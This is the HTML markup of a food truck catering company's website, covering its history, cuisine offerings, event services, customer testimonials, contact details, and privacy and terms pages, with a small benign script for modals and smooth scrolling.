                    <p>After two successful years, we expanded our fleet to include three specialized trucks, each focusing on different cuisine types. This diversification allowed us to serve larger events and cater to varied tastes. We also invested in custom-built vehicles with state-of-the-art kitchen equipment, significantly improving our service capacity and food quality.</p>
                </div>
                <div class="timelineitem5k9m">
                    <h4>2019 - Regional Recognition</h4>
                    <p>Our commitment to excellence earned us recognition as the most requested food truck service in the tri-county area. We began partnering with major event organizers and corporate clients, establishing long-term relationships that continue today. This year also marked our first appearance at the State Food Festival, where we served over 5,000 guests in a single weekend.</p>
                </div>
                <div class="timelineitem5k9m">
                    <h4>2021 - Innovation and Growth</h4>
                    <p>Despite challenging times, we adapted by implementing contactless ordering systems and enhanced safety protocols. We also launched our catering coordination service, helping clients plan entire events around our mobile dining experiences. Our fleet grew to six trucks, each with specialized menus developed by professional chefs.</p>
                </div>
                <div class="timelineitem5k9m">
                    <h4>2023 - Present Day</h4>
                    <p>Today, LinkiqHome operates a fleet of eight fully-equipped food trucks serving communities across the region. We've served over 200,000 meals and participated in more than 1,500 events. Our team has grown to include 35 dedicated staff members, from experienced chefs to logistics coordinators, all committed to delivering exceptional mobile dining experiences.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="cuisine8n3p" class="section4r8t">
        <h2 class="sectiontitle2m9k">Cuisine Specialties</h2>
        <div class="infogrid2n8k">
            <div class="infobox4m7p">
                <h4>Mediterranean Flavors</h4>
                <p>Our Mediterranean offerings include fresh falafel wraps, grilled kebabs, and authentic hummus preparations. We source ingredients directly from specialty importers to ensure authentic taste profiles. Each dish is prepared using traditional cooking methods adapted for mobile service.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Southern Comfort</h4>
                <p>Experience traditional Southern cooking with our fried chicken, mac and cheese, and collard greens. These recipes come from generations of home cooking, now available at your event. We use cast iron cookware and time-honored techniques to achieve authentic flavors.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Vegetarian Options</h4>
                <p>Every truck in our fleet offers substantial vegetarian selections. From veggie burgers to plant-based tacos, we ensure all guests have delicious options. Our chefs continuously develop new meat-free recipes that satisfy even dedicated carnivores.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Seafood Selections</h4>
                <p>Fresh fish tacos, shrimp po'boys, and grilled salmon are among our popular seafood offerings. We partner with sustainable fisheries and receive deliveries multiple times weekly to guarantee freshness. Our seafood truck features specialized refrigeration to maintain optimal quality.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Breakfast Service</h4>
                <p>Start your morning events right with our breakfast truck featuring made-to-order omelets, breakfast burritos, and fresh pastries. We serve premium coffee and offer both hearty and light morning options to fuel your day.</p>
            </div>
            <div class="infobox4m7p">
                <h4>International Street Food</h4>
                <p>Explore global flavors with dishes inspired by street food traditions from around the world. From Vietnamese banh mi to Greek gyros, our international menu brings authentic tastes to your location. Each recipe is researched and tested to ensure cultural authenticity.</p>
            </div>
        </div>
    </section>

    <section id="events5m7k" class="section4r8t">
        <h2 class="sectiontitle2m9k">Event Coordination</h2>
        <div class="grid3col5n7p">
            <div class="card9x2m">
                <h3>Wedding Receptions</h3>
                <p>Create a unique dining experience for your special day with our wedding catering services. We work closely with couples to design custom menus that reflect their tastes and accommodate guest preferences. Our trucks can be decorated to match your wedding theme, and we coordinate timing with your event schedule to ensure seamless service during cocktail hour or reception.</p>
            </div>
            <div class="card9x2m">
                <h3>Community Gatherings</h3>
                <p>From neighborhood block parties to charity fundraisers, we provide affordable catering solutions for community events. Our experience with large crowds ensures efficient service, and we can accommodate various budget levels. We often participate in local events at reduced rates to support community initiatives and bring people together through food.</p>
            </div>
            <div class="card9x2m">
                <h3>Sports Events</h3>
                <p>Keep fans fed and happy at sporting events with our high-volume service capabilities. We've catered everything from youth soccer tournaments to adult league championships. Our menu includes crowd-pleasing favorites that can be prepared quickly, ensuring minimal wait times even during peak periods between games.</p>
                <a href="#contact9k3m" class="ctabtn8k3x" style="font-size: 0.9rem; padding: 10px 25px; margin-top: 15px;">Click Here to Continue</a>
            </div>
        </div>
    </section>

    <section id="about2n8k" class="section4r8t">
        <h2 class="sectiontitle2m9k">Why Choose LinkiqHome</h2>
        <div class="history7m3k">
            <p style="font-size: 1.1rem; margin-bottom: 20px;">LinkiqHome Food Trucks has built its reputation on reliability, quality, and customer satisfaction. Our approach to mobile catering goes beyond simply serving food – we create memorable dining experiences that enhance your events.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Professional Standards</h3>
            <p>Every member of our team undergoes extensive training in food safety, customer service, and efficient operations. Our trucks are inspected regularly and maintain all required health certifications. We carry comprehensive insurance and follow strict protocols to ensure safe food handling at every event.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Flexible Solutions</h3>
            <p>We understand that every event is unique, which is why we offer customizable packages tailored to your specific needs. Whether you need one truck for an intimate gathering or multiple trucks for a large festival, we have the resources and experience to deliver. Our booking process is straightforward, and we work with your timeline and budget constraints.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Quality Ingredients</h3>
            <p>We source ingredients from local farms and trusted suppliers whenever possible. Our commitment to quality means we never compromise on freshness or taste. Each truck maintains relationships with specialty vendors to ensure authentic ingredients for their respective cuisines. We also accommodate dietary restrictions and allergies with advance notice.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Environmental Responsibility</h3>
            <p>LinkiqHome is committed to sustainable practices in our operations. We use biodegradable serving materials, implement waste reduction strategies, and maintain fuel-efficient vehicles. Our trucks are equipped with water conservation systems, and we partner with local composting services to minimize our environmental impact.</p>
        </div>
    </section>

    <section id="testimonials6p4n" class="reviews6p2n">
        <div class="section4r8t">
            <h2 class="sectiontitle2m9k">Customer Experiences</h2>
            <div class="reviewgrid3m8k">
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">JM</div>
                        <div>
                            <strong>Jennifer Morrison</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>We hired LinkiqHome for our company picnic and couldn't have been happier. The taco truck was a huge hit with everyone. The staff was professional, the food was delicious, and they handled our group of 150 people without any issues. Highly recommend for corporate events.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">RK</div>
                        <div>
                            <strong>Robert Kellerman</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>Booked the BBQ truck for my daughter's graduation party. The ribs were fall-off-the-bone tender and the sides were just as good as the main dishes. They arrived on time, set up quickly, and the presentation was fantastic. Our guests are still talking about it weeks later.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">SC</div>
                        <div>
                            <strong>Sandra Chen</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>The Asian Fusion truck catered our wedding reception and it was perfect. They worked with us to create a custom menu that included vegetarian options for several guests. The food was restaurant quality and the mobile setup added a fun, unique element to our celebration.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">DW</div>
                        <div>
                            <strong>David Whitmore</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>Used LinkiqHome for our neighborhood festival and they were outstanding. We had three different trucks which gave attendees great variety. The coordination was seamless and they handled the large crowd efficiently. Will definitely book them again for next year's event.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">MR</div>
                        <div>
                            <strong>Michelle Rodriguez</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>The pizza truck came to our son's birthday party and it was a hit with kids and adults alike. Watching them make fresh pizzas in the wood-fired oven was entertainment in itself. The quality was exceptional and they accommodated all the different topping requests from the children.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">TH</div>
                        <div>
                            <strong>Thomas Hendricks</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>Fantastic service from start to finish. The booking process was easy, communication was excellent, and the food exceeded expectations. We had the burger truck at our company's annual meeting and received nothing but compliments. The gourmet options were creative and delicious.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">LB</div>
                        <div>
                            <strong>Lisa Beaumont</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>We've used LinkiqHome multiple times for different events and they never disappoint. Their reliability and consistency are remarkable. The staff is always friendly and professional, and the food quality remains high regardless of which truck we book. They're our go-to for any catering needs.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">KP</div>
                        <div>
                            <strong>Kevin Patterson</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>The dessert truck was the perfect addition to our outdoor wedding. The variety of sweet treats gave guests something special to enjoy throughout the evening. The staff was accommodating and kept everything stocked despite the large crowd. Great value and exceptional service.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="contact9k3m" class="section4r8t">
        <h2 class="sectiontitle2m9k">Get In Touch</h2>
        <div class="history7m3k">
            <div class="infogrid2n8k">
                <div class="infobox4m7p">
                    <h4>Booking Information</h4>
                    <p>Ready to book our services for your next event? Contact us today to discuss your needs and receive a customized quote. We recommend booking at least 3-4 weeks in advance for optimal truck availability, though we can sometimes accommodate last-minute requests depending on our schedule.</p>
                    <p style="margin-top: 15px;"><a href="#contact9k3m" style="color: #667eea; font-weight: bold;">Click here to continue</a> with your booking inquiry.</p>
                </div>
                <div class="infobox4m7p">
                    <h4>Service Areas</h4>
                    <p>We proudly serve the entire metropolitan region and surrounding counties. Our trucks can travel to most locations within a 75-mile radius of our central kitchen. For events outside this area, please contact us to discuss travel arrangements and any additional fees that may apply.</p>
                </div>
                <div class="infobox4m7p">
                    <h4>Operating Hours</h4>
                    <p>Our booking office is open Monday through Friday, 9:00 AM to 6:00 PM, and Saturday from 10:00 AM to 4:00 PM. Our trucks operate seven days a week and can accommodate events at various times, including early morning breakfast services and late evening gatherings.</p>
                </div>
                <div class="infobox4m7p">
                    <h4>Special Requests</h4>
                    <p>We welcome special menu requests and dietary accommodations. Whether you need gluten-free options, vegan selections, or specific cultural dishes, our chefs work to fulfill your requirements. Discuss your needs during the booking consultation for the best results.</p>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer8k4n">
        <div class="footercontent3n7m">
            <div class="footersection5k2p">
                <h3>LinkiqHome Food Trucks</h3>
                <p>Delivering exceptional mobile dining experiences since 2015. Our commitment to quality, service, and customer satisfaction sets us apart in the food truck industry.</p>
            </div>
            <div class="footersection5k2p">
                <h3>Contact Information</h3>
                <p><strong>Phone:</strong> <a href="tel:+15558742390" class="phonenumber6n2k">+1 (555) 874-2390</a></p>
                <p><strong>Email:</strong> bookings@linkiqhome-trucks.com</p>
                <p><strong>Address:</strong> 2847 Riverside Commerce Park, Suite 190, Meadowbrook, State 45829</p>
            </div>
            <div class="footersection5k2p">
                <h3>Quick Links</h3>
                <a href="#services3m8p">Our Services</a>
                <a href="#fleet7n2k">Fleet Information</a>
                <a href="#events5m7k">Event Planning</a>
                <a href="#testimonials6p4n">Customer Reviews</a>
                <a href="javascript:void(0)" onclick="openModal('privacy')">Privacy Policy</a>
                <a href="javascript:void(0)" onclick="openModal('terms')">Terms of Service</a>
            </div>
            <div class="footersection5k2p">
                <h3>Business Hours</h3>
                <p><strong>Office:</strong></p>
                <p>Monday - Friday: 9:00 AM - 6:00 PM</p>
                <p>Saturday: 10:00 AM - 4:00 PM</p>
                <p>Sunday: Closed</p>
                <p style="margin-top: 15px;"><strong>Truck Service:</strong> 7 Days a Week</p>
            </div>
        </div>
        <div class="copyright9m3k">
            <p>&copy; 2024 LinkiqHome Food Trucks. All rights reserved. Operating under health permit #FT-2847-MBK</p>
        </div>
    </footer>

    <div id="privacyModal" class="modal7n4k">
        <div class="modalcontent8m2p">
            <span class="closemodal5k9n" onclick="closeModal('privacy')">&times;</span>
            <h2>Privacy Policy</h2>
            <p><strong>Last Updated: January 2024</strong></p>
            
            <h3>Information Collection</h3>
            <p>LinkiqHome Food Trucks collects information necessary to provide our mobile catering services. This includes contact details such as name, phone number, email address, and event location when you book our services. We also collect event-specific information including date, expected guest count, menu preferences, and any special dietary requirements.</p>
            
            <h3>Use of Information</h3>
            <p>The information we collect is used exclusively for fulfilling your catering requests and improving our services. We use contact information to communicate about bookings, confirm event details, and provide updates about our services. Event information helps us prepare appropriate quantities and ensure we meet your specific needs.</p>
            
            <h3>Information Sharing</h3>
            <p>We do not sell, trade, or rent your personal information to third parties. Information may be shared with our staff members only as necessary to fulfill your service requests. We may share information with vendors or suppliers only when required to complete your order, such as specialty ingredient sourcing.</p>
            
            <h3>Data Security</h3>
            <p>LinkiqHome implements reasonable security measures to protect your personal information from unauthorized access, alteration, or disclosure. We maintain physical, electronic, and procedural safeguards to protect the information we collect. However, no method of transmission over the internet is completely secure.</p>
            
            <h3>Communication Preferences</h3>
            <p>When you book our services, you may receive communications related to your event and occasional updates about our offerings. You can opt out of promotional communications at any time by contacting us directly. Service-related communications regarding your specific booking will still be sent as necessary.</p>
            
            <h3>Cookie Usage</h3>
            <p>Our website may use cookies to enhance user experience and analyze site traffic. These cookies do not collect personally identifiable information unless you provide it voluntarily. You can configure your browser to refuse cookies, though this may limit some website functionality.</p>
            
            <h3>Children's Privacy</h3>
            <p>Our services are not directed to individuals under the age of 18. We do not knowingly collect personal information from children. If we become aware that we have collected information from a child, we will take steps to delete such information promptly.</p>
            
            <h3>Policy Changes</h3>
            <p>LinkiqHome reserves the right to modify this privacy policy at any time. Changes will be posted on this page with an updated revision date. Continued use of our services after changes constitutes acceptance of the modified policy.</p>
            
            <h3>Contact Us</h3>
            <p>For questions about this privacy policy or our data practices, contact us at: <a href="tel:+15558742390">+1 (555) 874-2390</a> or email privacy@linkiqhome-trucks.com</p>
        </div>
    </div>

    <div id="termsModal" class="modal7n4k">
        <div class="modalcontent8m2p">
            <span class="closemodal5k9n" onclick="closeModal('terms')">&times;</span>
            <h2>Terms of Service</h2>
            <p><strong>Last Updated: January 2024</strong></p>
            
            <h3>Service Agreement</h3>
            <p>By booking LinkiqHome Food Trucks services, you agree to these terms and conditions. These terms constitute a binding agreement between you (the client) and LinkiqHome Food Trucks (the service provider). Please read these terms carefully before confirming your booking.</p>
            
            <h3>Booking and Reservations</h3>
            <p>All bookings must be made through our official channels and confirmed in writing. A deposit of 25% is required to secure your reservation, with the balance due 48 hours before the event. Bookings are considered confirmed only after deposit receipt and written confirmation from our team.</p>
            
            <h3>Cancellation Policy</h3>
            <p>Cancellations made more than 14 days before the event date will receive a full refund minus a 10% processing fee. Cancellations made 7-14 days before the event will receive a 50% refund. Cancellations made less than 7 days before the event are non-refundable. We reserve the right to cancel services due to weather, equipment failure, or other circumstances beyond our control, in which case a full refund will be provided.</p>
            
            <h3>Event Requirements</h3>
            <p>Clients must provide adequate space for truck parking and operation, typically requiring a minimum of 30 feet by 12 feet of level ground. Access to standard electrical outlets (when specified) and proximity to the serving area is necessary. Clients are responsible for obtaining any required permits for food service at their venue.</p>
            
            <h3>Menu and Service</h3>
            <p>Menus are subject to ingredient availability and may require substitutions with comparable items. Final guest counts must be provided 72 hours before the event. We will prepare for the confirmed number plus 10% buffer. Significant increases in guest count may not be accommodated without advance notice.</p>
            
            <h3>Liability</h3>
            <p>LinkiqHome Food Trucks maintains comprehensive liability insurance and follows all health and safety regulations. We are not responsible for injuries or damages resulting from client negligence, venue conditions, or circumstances beyond our control. Clients agree to indemnify LinkiqHome against claims arising from their event.</p>
            
            <h3>Payment Terms</h3>
            <p>Payment can be made via credit card, check, or electronic transfer. All prices are quoted in US dollars and are subject to applicable taxes. Additional fees may apply for services outside our standard service area, extended service hours, or special equipment requirements.</p>
            
            <h3>Food Safety</h3>
            <p>We adhere to all local health department regulations and maintain current food service permits. While we take precautions to accommodate dietary restrictions and allergies when notified in advance, clients with severe allergies should exercise caution as our kitchens handle multiple ingredients.</p>
            
            <h3>Intellectual Property</h3>
            <p>All content on our website and marketing materials, including logos, images, and text, is the property of LinkiqHome Food Trucks and protected by copyright laws. Unauthorized use of our intellectual property is prohibited.</p>
            
            <h3>Dispute Resolution</h3>
            <p>Any disputes arising from these terms or our services will be resolved through good faith negotiation. If negotiation fails, disputes will be subject to binding arbitration in accordance with local arbitration rules.</p>
            
            <h3>Modifications</h3>
            <p>LinkiqHome reserves the right to modify these terms at any time. Clients will be notified of significant changes, and continued use of our services constitutes acceptance of modified terms.</p>
            
            <h3>Contact Information</h3>
            <p>For questions regarding these terms, contact us at: <a href="tel:+15558742390">+1 (555) 874-2390</a> or email legal@linkiqhome-trucks.com</p>
        </div>
    </div>

    <script>
        function openModal(type) {
            if(type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'block';
            } else if(type === 'terms') {
                document.getElementById('termsModal').style.display = 'block';
            }
        }
        
        function closeModal(type) {
            if(type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'none';
            } else if(type === 'terms') {
                document.getElementById('termsModal').style.display = 'none';
            }
        }
        
        window.onclick = function(event) {
            if(event.target.classList.contains('modal7n4k')) {
                event.target.style.display = 'none';
            }
        }
        
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if(target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    </script>

    <a href="/" alt="stats counter free" target="_blank" >
<img  src="https://sstatic1.histats.com/0.gif?4977134&101" alt="stats counter free" border="0">
        
</body>
</html>


